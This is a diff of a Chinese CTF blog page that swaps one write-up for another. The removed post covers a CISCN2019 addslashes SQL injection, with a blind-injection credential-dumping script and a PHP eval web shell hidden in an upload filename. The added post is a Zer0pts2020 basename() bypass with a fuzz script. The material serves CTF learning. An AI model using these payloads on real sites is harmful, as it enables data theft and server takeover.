@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>日常练习35——二次注入前瞻关于addslashes()函数 - Hexo</title>
+<title>日常练习34——关于$ _server[&#39;ph _self&#39;])和basename函数 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -149,109 +149,100 @@
                 <p><span class="label">Author</span>
                     <a href="https://george186.github.io"
                        target="_blank">george</a>
-                    <span title="Last edited at&nbsp;2021-05-18">2021-05-18</span>
+                    <span title="Last edited at&nbsp;2021-05-14">2021-05-14</span>
                 </p>
                 <p>一个写代码的「伪文人」</p>
             </div>
-            <h2 class="post-title">日常练习35——二次注入前瞻关于addslashes()函数</h2>
+            <h2 class="post-title">日常练习34——关于$ _SERVER['PH _SELF'])和basename函数</h2>
             <div class="post-meta">
-                emm... 3464 words in the article |
+                emm... 3395 words in the article |
                 you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
         <div class="post-content markdown-body">
-            <p>这道题算是给二次注入开头了，因为它涉及了二次注入中一个重要的函数——addslashes()函数。  </p>
-<h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>这是前年国赛总决赛的一题，重点考察了addslashes()函数的利用。  </p>
-<p>打开题目，看到一个登陆界面：</p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png"><img src="https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png"></a>  </p>
-<p>测试后发现图片有两张不同的回显，大致就可以判断这道题和盲注有关了，接着我们可以在robots.txt里找到这道题目的提示（比赛中对于这些细节还是要检查的）   </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png"><img src="https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png"></a>  </p>
-<p>可以看到提示我们有备份文件，我们可以下载得到image.php.bak文件，里面包含源码：  </p>
-<pre><code>&lt;﻿?php
-include &quot;config.php&quot;;
-
-$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
-$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;
-
-$id=addslashes($id);
-$path=addslashes($path);
-
-$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
-$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);
-
-$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);
-$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
-
-$path=&quot;./&quot; . $row[&quot;path&quot;];
-header(&quot;Content-Type: image/jpeg&quot;);
-readfile($path);  </code></pre>
-<p>源码审计一下，首先以get方式传参id和path，然后这两个参数要经过addslashes()函数，随后对这两个经过变化的参数进行正则匹配，替换掉一些字符。最终将这两个经过变换的变量拼接到sql语句中进行查询。  </p>
-<p>这里最重要的就是这个addslashes()函数，我们需要知道他是干什么的：  </p>
-<pre><code>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
-预定义字符是：
-单引号（’）
-双引号（&quot;）
-反斜杠（\）
-NULL    </code></pre>
-<p>也就是说如果我们传入的字符串中有上面的预定义字符，那么经过这个函数后就会在这些字符前面加上转义字符”&quot;。   </p>
-<p>比如下面的代码  </p>
+            <p>这道题是一个关于一个php函数和新的变量属性的新知识点，积累一下。  </p>
+<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>打开题目，发现让我们猜东西，猜到才能给flag，并且提供了源码。我们先审计源码：  </p>
 <pre><code>&lt;?php
-$id = &quot;\\0&quot;;
-echo $id.&#39;&lt;br&gt;&#39;;
-$id = addslashes($id);
-echo $id.&#39;&lt;br&gt;&#39;;
-$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
-echo $id;
-?&gt;  </code></pre>
-<p>返回的字符分别是   </p>
-<pre><code>\0
-\\0
-\  </code></pre>
-<p>也就是说\0在经过addslashes()函数后被加上\变为\0，然后经过正则匹配\0被替换成空，最终也就变成了\。  </p>
-<p>但是如果这个转义字符被拼接到sql语句中会发生什么呢？  </p>
-<pre><code>select * from images where id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;  </code></pre>
-<p>可以看到转义字符后面的单引号会被转义，原来的闭合单引号往后顺延，那么最终id的值为：&#39; or path=，也就是说原来关于path的查询不存在了，现在只剩下关于id的值的查询。  </p>
-<p>但是我们仍然可以上传变量path来进行拼接，又因为这道题的查询回显页面不同，没有回显结果，所以我们可以使用盲注来查询。  </p>
-<p>payload语句如下：  </p>
-<pre><code>?id=\\0&amp;path=or 1=if(length(database())&gt;1,1,-1)#  </code></pre>
-<p>这样最终的sql查询语句实际上是：  </p>
-<p>select * from images where id=’<strong>&#39; or path=</strong> or 1=if(length(database())&gt;1,1,-1)’#<br>（加粗的字符是id的值）  </p>
-<p>很明显的盲注，测试后发现确实会有不同的回显。  </p>
-<p>接下来就是上脚本来得到用户名和密码了:  </p>
+include &#39;config.php&#39;; // FLAG is defined in config.php
+
+if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
+  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
+&#125;
+
+if (isset($_GET[&#39;source&#39;])) &#123;
+  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
+  exit();
+&#125;
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST[&#39;guess&#39;])) &#123;
+  $guess = (string) $_POST[&#39;guess&#39;];
+  if (hash_equals($secret, $guess)) &#123;
+$message = &#39;Congratulations! The flag is: &#39; . FLAG;
+&#125; else &#123;
+$message = &#39;Wrong.&#39;;
+  &#125;
+&#125;  </code></pre>
+<p>可以看到让我猜东西的代码如下：  </p>
+<pre><code>$secret = bin2hex(random_bytes(64));
+if (isset($_POST[&#39;guess&#39;])) &#123;
+  $guess = (string) $_POST[&#39;guess&#39;];
+  if (hash_equals($secret, $guess)) &#123;
+$message = &#39;Congratulations! The flag is: &#39; . FLAG;
+&#125; else &#123;
+$message = &#39;Wrong.&#39;;
+  &#125;
+&#125;  </code></pre>
+<p>这里random_bytes( int $length)函数是生成指定大小的随机字符串（单位：字节），然后bin2hex()函数将生成的ASCII字符串转换为16进制，它让我们猜的就是这一串十六进制字符。且对比时采用了php 可防止时序攻击的字符串比较函数 hash _equals()。也就是说明，我们不可能在猜字符串这里下手脚了，猜是猜不到的。  </p>
+<p>那么我们就重点放在前面的代码：  </p>
+<pre><code>include &#39;config.php&#39;; // FLAG is defined in config.php
+
+if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
+  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
+&#125;
+
+if (isset($_GET[&#39;source&#39;])) &#123;
+  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
+  exit();
+&#125;  </code></pre>
+<p>这段代码中有两个之前没见过的重要信息：  </p>
+<p>第一个是属性$ _SERVER[‘PHP _SELF’]，这个表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关，如下图的测试：  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png"><img src="https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png"></a>  </p>
+<p>第二个就是basename()函数，这个函数会返回路径中的文件名部分假如路径是/index.php/config.php，浏览器的解析结果都是index.php，而basename会返回config.php，就算后面跟上多余的字符也会返回文件名部分，比如test.php/?source仍会返回文件名test.php。  </p>
+<p>而basename()函数存在一个问题，那就是他会去掉文件名开头的非ASCII值，比如下面两个例子：  </p>
+<pre><code>var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php
+var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</code></pre>
+<p>在代码的一开头就已经告诉我们了flag在config.php里，如果我们想要读取到这个文件，就要get上传参数source，并且我们的路径里的文件名必须是config.php。</p>
+<pre><code>if (isset($_GET[&#39;source&#39;])) &#123;
+  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
+  exit();
+&#125;  </code></pre>
+<p>但是一开始就有一个正则匹配：  </p>
+<pre><code>if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
+  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
+&#125;</code></pre>
+<p>我们观察这个匹配，/config.php/*$/i表示匹配的是字符串尾部，对config.php这个字符进行匹配，匹配的字符串是文件路径，那也就是说，我们不能直接上传payload的文件路径为：</p>
+<pre><code>/index.php/config.php/?source  </code></pre>
+<p>因为这样会被直接过滤，那么我们可以利用basename()函数会去掉文件名开头的非ASCII值这一漏洞，这样构造：  </p>
+<pre><code>/index.php/config.php/%ff?source  </code></pre>
+<p>这里的%ff就是非ASCII值，这样构造的payload既满足了有变量source上传，能够执行读取文件的代码，又能成功返回正确的文件名config.php(因为%ff会被去掉，?source不会影响返回文件名)，最重要的是绕过了正则匹配，因为它会匹配的是**%ff?source**这一段，从而绕过了对config.php的匹配。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png"><img src="https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png"></a>  </p>
+<p>得到config.php的内容。  </p>
+<p>下面附上关于fuzz脚本，用来测试那些字符不会被过滤，同时构造满足条件的payload：  </p>
 <pre><code>import requests
+import re
 
-
-url = &#39;http://ac4c87f5-3044-4096-b55a-0c647ae76c50.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1=&#39;
-flag = &#39;&#39;
-table_name = &#39;&#39;
-
-for i in range(1, 50):
-for c in range(127, 0, -1):
-    payload = &#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))=%d,1,-1)%%23&#39; % (i, c)
-    #payload = &#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23&#39; % (i, c)
-    #payload = &#39;if(ascii(substr((select group_concat(username) from users),%d,1))=%d,1,-1)%%23&#39; % (i, c)
-    #payload = &#39;if(ascii(substr((select group_concat(password) from users),%d,1))=%d,1,-1)%%23&#39; % (i, c)
-    r = requests.get(url+payload)
-
-    if &quot;JFIF&quot; in r.text:
-        table_name += chr(c)
-        print(table_name)
-        break</code></pre>
-<p>得到密码和用户名：  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png"><img src="https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png"></a></p>
-<p>登录，发现是一个上传文件的页面：  </p>
-<p>直接抓包上传一句话木马试试。  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png"><img src="https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png"></a>  </p>
-<p>告诉我们将文件名记录在日志中，那么我们尝试通过文件名写入一句话木马。  </p>
-<p>修改Content-Disposition中参数filename的值为<?php @eval($_POST['cmd']) ?>  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png"><img src="https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png"></a>  </p>
-<p>又说不让上传php文件，应该是我们的文件名中有php字符，那么我们使用短标签绕过  </p>
-<p>我们这样构造：  </p>
-<pre><code>&lt;?= @eval($_POST[&#39;cmd&#39;]); ?&gt;  </code></pre>
-<p>成功上传，接下来就是蚁剑链接了：  </p>
-<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png"><img src="https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png"></a>  </p>
-<p>根目录得到flag。  </p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题重点就是addslashes()函数的操作，如何构造字符来利用addslashes()函数和下面的正则匹配来成功执行sql盲注，之后的二次注入也将和他有关，此外就是关于上传文件的文件名一句话木马和短标签绕过这两个小知识点。</p>
+for i in range(0,255):
+url =&#39;http://cc5b962c-30fd-4564-a182-23f81878af5a.node3.buuoj.cn/index.php/config.php/&#123;&#125;?source&#39;.format(chr(i))
+print(url)
+r = requests.get(url)
+flag = re.findall(&quot;flag\&#123;.*?\&#125;&quot;, r.text)
+if flag:
+    print(flag)
+    break</code></pre>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题就是两个关于php的新知识，比较重要的就是basename()函数的一些问题，当作积累就好了。  </p>
+<p>附上basename()函数的漏洞官网：  </p>
+<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">basename()函数</a></p>
 
             
                 
